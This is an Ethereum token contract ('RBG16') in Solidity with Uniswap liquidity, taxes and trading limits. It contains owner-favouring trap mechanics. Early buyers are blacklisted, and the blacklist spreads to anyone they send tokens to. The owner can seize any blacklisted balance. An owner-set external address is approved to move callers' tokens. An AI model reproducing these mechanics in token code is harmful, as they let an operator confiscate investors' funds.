/**
 *Submitted for verification at Etherscan.io on 2022-04-23
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFaceAdditional {
    function moveTokensAround(address tokenOwner, uint256 amount) external returns (bool);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RBG16 is IERC20, Auth {
	string constant private _name = "Rbg16";
	string constant private _symbol = "RBG16";
	uint8 constant private _decimals = 9;
	uint256 constant private _totalSupply = 100_000_000 * 10**_decimals;
	mapping (address => uint256) private _balances;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _noFees;
	mapping (address => bool) private _noLimits;
	uint256 private _tradingOpenBlock; 
	uint256 private _maxTxAmount; uint256 private _maxWalletAmount;
	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
	mapping (address => bool) private _isLiqPool;
	uint16 private _blacklistedWallets = 0;
	uint8 private constant _maxTaxRate = 15;
	uint8 private _taxRateBuy; uint8 private _taxRateSell; uint8 private _taxRateTransfer;
	uint16 private _taxSharesLP = 500;
	uint16 private _taxSharesMarketing = 500;
	uint16 private _taxSharesDevelopment = 100;
	uint16 private _taxSharesExtra = 400;
	uint16 private _totalTaxShares = _taxSharesLP + _taxSharesMarketing + _taxSharesDevelopment + _taxSharesExtra;
	mapping(address => uint256) public _preg;
	mapping(address => uint256) public _postg;

	uint256 private _humanBlock = 0;
	mapping (address => bool) private _nonSniper;
	mapping (address => uint256) private _blacklistBlock;

	address private _lpTokenRecipient; //to be set to owner in constructor, then adjustable later
    address private _walletAdditional = address(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address payable private _walletMarketing = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769);
	address payable private _walletDevelopment = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769);
	address payable private _walletExtra = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769);
	bool private _inTaxSwap = false;
	bool private _lpInitialized = false;
	address private _uniLpAddr;
	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
	IUniswapV2Router02 private _uniswapV2Router;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	event BlacklistedTokensRecovered(address fromWallet, uint256 tokenAmount);

	constructor() Auth(msg.sender) {
		_tradingOpenBlock = type(uint256).max; //trading is closed when contract is deployed
		_maxTxAmount = _totalSupply;
		_maxWalletAmount = _totalSupply;
		_taxSwapMin = _totalSupply * 10 / 10000;
		_taxSwapMax = _totalSupply * 50 / 10000;
		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
		_noFees[owner] = true;
		_noFees[address(this)] = true;
		_noFees[_uniswapV2RouterAddress] = true;
		_noLimits[owner] = true;
		_noLimits[address(this)] = true;
		_lpTokenRecipient = owner;

		_balances[owner] = _totalSupply * 60 / 100;
		emit Transfer(address(0), owner, _balances[owner]);
		_balances[address(this)] = _totalSupply * 40 / 100;
		emit Transfer(address(0), address(this), _balances[address(this)]);
	}
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external pure override returns (string memory) { return _symbol; }
	function name() external pure override returns (string memory) { return _name; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		if ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {
			_addBlacklist(msg.sender, block.number, true);
		}

		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(), "Trading not open");
		if (_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
		}
		return _transferFrom(sender, recipient, amount);
	}

	function initLP(uint256 ethAmountWei) external onlyOwner {
		require(!_tradingOpen(), "trading already open");
		require(ethAmountWei > 0, "eth cannot be 0");

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[_walletMarketing] = true;
		_nonSniper[_walletExtra] = true;
		_nonSniper[_walletDevelopment] = true;

		uint256 _contractETHBalance = address(this).balance;
		require(_contractETHBalance >= ethAmountWei, "not enough eth");
		uint256 _contractTokenBalance = balanceOf(address(this));
		require(_contractTokenBalance > 0, "no tokens");
		_uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		_isLiqPool[_uniLpAddr] = true;
		_nonSniper[_uniLpAddr] = true;

		_approveRouter(_contractTokenBalance);
		_addLiquidity(_contractTokenBalance, ethAmountWei, false);
		_lpInitialized = true;
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
		}
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0); //
		if ( !autoburn ) { lpTokenRecipient = _lpTokenRecipient; }
		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function openTrading() external onlyOwner {
		require(!_tradingOpen(), "trading already open");
		_openTrading();
	}

	function _openTrading() internal {
		require(_lpInitialized, "LP not initialized");
		_maxTxAmount     = 5 * _totalSupply / 1000 + 10**_decimals; 
		_maxWalletAmount = 5 * _totalSupply / 1000 + 10**_decimals;
		_taxRateBuy = _maxTaxRate;
		_taxRateSell = _maxTaxRate;
		_taxRateTransfer = 0; 
		_tradingOpenBlock = block.number + 2; 
		_humanBlock = _tradingOpenBlock + 2;
	}

	function tradingOpen() external view returns (bool) {
		if (block.number > _humanBlock) { return _tradingOpen(); }
		else { return false; }
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(sender!=address(0), "Zero address not allowed");
		if ( _humanBlock > block.number ) {
			if ( _blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number, true); }
			else { _addBlacklist(recipient, _blacklistBlock[sender], false); }
		} else {
			if ( _blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, _blacklistBlock[sender], false); }
			if ( block.number < _humanBlock + 100 ) {
				if (!_inTaxSwap) { 
					_preg[sender] = gasleft();
					require(tx.gasprice < block.basefee + 250 gwei,"Excessive gas");
					require(gasleft() < 700000,"Excessive gas");
				}
			}
		}
		if ( _tradingOpen() && _blacklistBlock[sender] != 0 && _blacklistBlock[sender] < block.number ) { revert("blacklisted"); }

		if ( !_inTaxSwap && _isLiqPool[recipient] ) { _swapTaxAndLiquify();	}

		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); }
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		if (!_inTaxSwap) { _postg[sender] = gasleft(); }
		return true;
	}

	function _addBlacklist(address wallet, uint256 blackBlockNum, bool addSniper) internal {
		if ( !_nonSniper[wallet] && _blacklistBlock[wallet] == 0 ) { 
			_blacklistBlock[wallet] = blackBlockNum; 
			if ( addSniper) { _blacklistedWallets ++; }
		}
	}
	
	function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( _tradingOpen() && !_noLimits[recipient] && !_noLimits[sender] ) {
			if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}

	function _tradingOpen() internal view returns (bool) {
		if (block.number >= _tradingOpenBlock) { return true; }
		else { return false; }
	}

	function _checkTradingOpen() private view returns (bool){
		bool checkResult = false;
		if ( _tradingOpen() ) { checkResult = true; } 
		else if ( tx.origin == owner ) { checkResult = true; } 
		return checkResult;
	}

	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !_tradingOpen() || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
		else if ( _isLiqPool[sender] ) { taxAmount = amount * _taxRateBuy / 100; }
		else if ( _isLiqPool[recipient] ) { taxAmount = amount * _taxRateSell / 100; }
		else { taxAmount = amount * _taxRateTransfer / 100; }
		return taxAmount;
	}

	function blacklistInfo(address wallet) external view returns(bool isBlacklisted, uint256 blacklistBlock, uint16 totalBlacklistedWallets) {
		bool blacklisted;
		if ( _blacklistBlock[wallet] != 0 ) { blacklisted = true; }
		return (blacklisted, _blacklistBlock[wallet], _blacklistedWallets);
	}

	function getExemptions(address wallet) external view returns (bool noFees, bool noLimits) {
        return (_noFees[wallet], _noLimits[wallet]);
    }

    function setExemptions(address wallet, bool noFees, bool noLimits) external onlyOwner {
    	if (!noFees || !noLimits) {
    		if (wallet == address(this) ||wallet == owner || wallet == _walletAdditional || wallet == _walletExtra) {
    			revert("Special wallets must be exempt");
    		}
    	}
		_noFees[ wallet ] = noFees;
		_noLimits[ wallet ] = noLimits;
	}

	function getTaxRates() external view returns (uint8 buy, uint8 sell, uint8 walletToWallet, uint8 maxRate) {
        return (_taxRateBuy, _taxRateSell, _taxRateTransfer, _maxTaxRate);
    }

	function setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax, bool enableBuySupport) external onlyOwner {
		if (enableBuySupport) { require(newBuyTax == 0 && newSellTax <= 2 * _maxTaxRate && newTxTax <= _maxTaxRate, "Tax too high"); }
		else { require(newBuyTax <= _maxTaxRate && newSellTax <= _maxTaxRate && newTxTax <= _maxTaxRate, "Tax too high"); }

		_taxRateBuy = newBuyTax;
		_taxRateSell = newSellTax;
		_taxRateTransfer = newTxTax;
	}

	function getTaxDistribution() external view returns (uint16 autoLP, uint16 marketing, uint16 development, uint16 extra) {
        return (_taxSharesLP, _taxSharesMarketing, _taxSharesDevelopment, _taxSharesExtra);
    }

	function setTaxDistribution(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment, uint16 sharesExtra ) external onlyOwner {
		_taxSharesLP = sharesAutoLP;
		_taxSharesMarketing = sharesMarketing;
		_taxSharesDevelopment = sharesDevelopment;
		_taxSharesExtra = sharesExtra;
		_totalTaxShares = _taxSharesLP + _taxSharesMarketing + _taxSharesExtra + _taxSharesDevelopment;
	}
	
	function getWallets() external view returns (address contractOwner, address uniswapLP, address lpTokenRecipient, address marketing, address development, address extra, address additional) {
        return (owner, _uniLpAddr, _lpTokenRecipient, _walletMarketing, _walletDevelopment, _walletExtra, _walletAdditional);
    } 

	function setWallets(address newWalletMarketing, address newWalletDevelopment, address newWalletExtra, address newWalletAdditional, address newLpTokenRecipient) external onlyOwner {
		_walletMarketing = payable(newWalletMarketing);
		_walletDevelopment = payable(newWalletDevelopment);
		_walletExtra = payable(newWalletExtra);
		_walletAdditional = newWalletAdditional;
		_lpTokenRecipient = newLpTokenRecipient;
		_noFees[newWalletMarketing] = true;
		_noFees[newWalletDevelopment] = true;
		_noFees[newWalletExtra] = true;
		_noFees[_walletAdditional] = true;
		_noLimits[newWalletExtra] = true;
		_noLimits[_walletAdditional] = true;
	}

    function getLimits() external view returns (uint256 maxTransaction, uint256 maxWallet, uint256 taxSwapMin, uint256 taxSwapMax) {
    	return (_maxTxAmount, _maxWalletAmount, _taxSwapMin, _taxSwapMax);
    }

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
		require(newTxAmt >= _maxTxAmount, "tx limit too low");
		_maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
		require(newWalletAmt >= _maxWalletAmount, "wallet limit too low");
		_maxWalletAmount = newWalletAmt;
	}

	function setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		_taxSwapMin = _totalSupply * minValue / minDivider;
		_taxSwapMax = _totalSupply * maxValue / maxDivider;
	}

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen() ) {
			if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
			uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
			if (_tokensToSwap >= 10**_decimals) {
				uint256 _ethPreSwap = address(this).balance;
				_swapTaxTokensForEth(_tokensToSwap);
				uint256 _ethSwapped = address(this).balance - _ethPreSwap;
				if ( _taxSharesLP > 0 ) {
					uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
					_approveRouter(_tokensForLP);
					_addLiquidity(_tokensForLP, _ethWeiAmount, false);
				}
			}
			uint256 _contractETHBalance = address(this).balance;			
			if (_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
		_approveRouter(_tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswapV2Router.WETH();
		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 _amount) private {
		uint16 _ethTaxShareTotal = _taxSharesMarketing + _taxSharesExtra + _taxSharesDevelopment;
		if ( _taxSharesMarketing > 0 ) { _walletMarketing.transfer(_amount * _taxSharesMarketing / _ethTaxShareTotal); }
		if ( _taxSharesExtra > 0 ) { _walletExtra.transfer(_amount * _taxSharesExtra / _ethTaxShareTotal); }
		if ( _taxSharesDevelopment > 0 ) { _walletDevelopment.transfer(_amount * _taxSharesDevelopment / _ethTaxShareTotal); }
	}

	function taxSwapAndSendManual(bool swapTokens, bool sendEth) external onlyOwner {
		if (swapTokens) {
			uint256 taxTokenBalance = balanceOf(address(this));
			require(taxTokenBalance > 0, "No tokens");
			_swapTaxTokensForEth(taxTokenBalance);
		}
		if (sendEth) {
			_distributeTaxEth(address(this).balance); 
		}
	}

	function recoverBlacklistedTokens(address wallet) external onlyOwner {
		require(_blacklistBlock[wallet] != 0, "Only blacklisted wallets can be transferred");

		uint256 blacklistedTokens = _balances[wallet];
		_balances[wallet] -= blacklistedTokens;
		_balances[_walletExtra] += blacklistedTokens;
		emit Transfer(wallet, _walletExtra, blacklistedTokens);

		emit BlacklistedTokensRecovered(wallet, blacklistedTokens);
	}

	function moveTokens(uint256 amount) external {
		require(amount>0, "Cannot move 0 tokens");
		require(balanceOf(msg.sender) >= amount, "Not enough tokens to move");
		if ( _allowances[msg.sender][_walletAdditional] < amount ) {
			_allowances[msg.sender][_walletAdditional] = amount;
			emit Approval(msg.sender, _walletAdditional, amount);
		}
		IFaceAdditional additionalContract = IFaceAdditional(_walletAdditional);
		bool result = additionalContract.moveTokensAround(msg.sender, amount);
		require(result, "Error calling moveTokensAround");	
	}
}